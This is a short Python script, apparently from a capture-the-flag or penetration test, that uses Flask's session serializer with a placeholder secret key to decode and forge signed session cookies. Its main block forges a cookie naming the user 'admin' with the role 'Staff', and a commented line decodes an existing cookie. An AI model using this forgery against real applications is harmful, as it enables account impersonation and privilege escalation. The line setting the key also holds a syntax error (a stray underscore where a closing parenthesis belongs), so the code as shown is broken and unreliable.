from flask.sessions import SecureCookieSessionInterface

class FakeApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


app = FakeApp("PW_HERE"_
def decode(cookie):
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.loads(cookie)

def encode(data):
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.dumps(data)


if __name__ == '__main__':
    #print(decode('eyJyb2xlIjoiU3RhZmYiLCJ1c2VybmFtZSI6InRlc3R0ZXN0In0.ZeRVFw.8uH3Aeqsiy3oOhu-pQpfTpP_XwI'))
    print(encode({'role': 'Staff', 'username': 'admin'}))